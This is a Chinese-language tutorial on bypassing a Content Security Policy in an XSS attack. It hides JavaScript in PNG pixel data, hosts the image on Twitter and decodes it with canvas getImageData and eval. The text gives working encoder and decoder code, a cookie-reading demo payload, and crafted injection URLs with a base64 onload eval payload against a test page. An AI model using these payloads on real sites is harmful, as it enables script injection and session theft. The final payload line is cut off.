---
title: CSP绕过方法之隐藏图像
---



# CSP绕过方法之隐藏图像

XSS漏洞中，可使用CSP绕过。

CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。

CSP绕过原理：利用HTML Canvas将恶意JavaScript代码转化为PNG图像，以隐藏恶意代码；然后将图像上传至正规网站，如Twitter或Google(通常由CSP列入白名单)；再利用canvas `getImageData`方法，从图像中提取“隐藏的JavaScript代码”并执行。



### 创建图像

使用`putImageData`方法创建一个图像，用RGB色彩模式表示"Hello, World!"字符串（每三个一组），在浏览器控制台中运行如下代码：

```
(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "Hello, World!";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
```

运行后，浏览器左上角会显示一个图像：

![](https://gitee.com/chen-lishan/tuc/raw/master/控制台.png)





### 从图像中提取代码

通过getImageData方法，将生成的PNG图像转换为原始字符串：

```
t = document.getElementsByTagName("img")[0];
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
console.log(a);
document.getElementsByTagName("body")[0].innerHTML=a;
```

运行代码之后显示：



![](https://gitee.com/chen-lishan/tuc/raw/master/hello.png)





### 在推特上的操作

当上传的图片太小时，推特上会上传失败，因此需要使用一个较长的JavaScript代码。可以在前面那段代码最后添加随机注释，以此来创建一个较大的图像：

```
(function() {
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    var stringenc = "function asd() {\
        var d = document;\
        var c = 'cookie';\
        alert(d[c]);\
    };asd();/*Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam aliquam blandit metus vel elementum. Mauris mi tortor, congue eget fringilla id, tempus a tellus. Morbi laoreet vitae ipsum vel dapibus. Nunc eu faucibus ligula. Donec maximus malesuada justo. Nulla congue, risus quis dapibus porttitor, metus quam rutrum dolor, ac maximus nibh metus quis enim. Aenean hendrerit venenatis massa ac gravida. Donec at nisi quis ex sollicitudin bibendum sit amet ac quam.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\
    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\
    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\
    Vestibulum tincidunt diam vel diam semper posuere. Nulla facilisi. Curabitur a facilisis lorem, eu porta leo. Sed pharetra eros et malesuada mattis. Donec tincidunt elementum mauris quis commodo. Donec nec vulputate nulla. Nunc luctus orci lacinia nunc sodales, vitae cursus quam tempor. Cras ullamcorper ullamcorper urna vitae pulvinar. Curabitur ac pretium felis. Vivamus vel scelerisque nisi. Pellentesque lacinia consequat nibh, vitae rhoncus tellus faucibus eget. Ut pulvinar est non tellus tristique sodales. Aenean eget velit non turpis tristique pretium id eu dolor. Nulla sed eros quis urna facilisis scelerisque. Nam orci neque, finibus eget odio et, elementum finibus erat.*/";
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
```

运行代码：

![](https://gitee.com/chen-lishan/tuc/raw/master/图片.png)



然后上传到推特

然后在用来测试的webapp中执行eval操作。



获得远程推特图像，可以发送下列请求：

```
/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22%3E%3Ca+href=%22
```

注入JavaScript行，将图像转换为外部JavaScript库并绕过CSP：

```
t = document.getElementById("jsimg");
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth,
    h = t.offsetHeight;
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
cx.drawImage(t, 0, 0);
var x = cx.getImageData(0, 0, w, h).data;
var a = "",
    l = x.length,
    p = -1;
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]);
    if (x[i + 1]) a += s(x[i + 1]);
    if (x[i + 2]) a += s(x[i + 2]);
}
eval(a)
```

将其base64编码后，放到onload属性中，

```
onload='javascript:eval(atob("dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp"))'
```

接着，

```
/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3Dpng%26name%3D120x120%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJqc2ltZyIpOwp2YXIgcyA9IFN0cmluZy5mcm9tQ2hhckNvZGUsIGMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKdmFyIGNzID0gYy5zdHlsZSwKICAgIGN4ID0gYy5nZXRDb250ZXh0KCIyZCIpLAogICAgdyA9IHQub2Zmc2V0V2lkdGgsCiAgICBoID0gdC5vZmZzZXRIZWlnaHQ7CmMud2lkdGggPSB3OwpjLmhlaWdodCA9IGg7CmNzLndpZHRoID0gdyArICJweCI7CmNzLmhlaWdodCA9IGggKyAicHgiOwpjeC5kcmF3SW1hZ2UodCwgMCwgMCk7CnZhciB4ID0gY3guZ2V0SW1hZ2VEYXRhKDAsIDAsIHcsIGgpLmRhdGE7CnZhciBhID0gIiIsCiAgICBsID0geC5sZW5ndGgsCiAgICBwID0gLTE7CmZvciAodmFyIGkgPSAwOyBpIDwgbDsgaSArPSA0KSB7CiAgICBpZiAoeFtpICsgMF0pIGEgKz0gcyh4W2kgKyAwXSk7CiAgICBpZiAoeFtpICsgMV0pIGEgKz0gcyh4W2kgKyAxXSk7CiAgICBpZiAoeFtpICsgMl0pIGEgKz0gcyh4W2kgKyAyXSkKfQpldmFsKGEp%22))%27%3E%3Ca+href=%22
```



但是，由于浏览器阻止了诸如getImageData跨域加载图像之类的方法，因此需要对crossorigin属性进行注入，注入到img标记中，注入值为“anonymous”的Crossorigin属性，接下来就可以成功执行函数`alert(document ent.cookie)`

完整的payload：

```
/xss.php?lang=https%3A%2F%2Fpbs.twimg.com%2Fmedia%2FETxfIq-WoAA2H5C%3Fformat%3D
```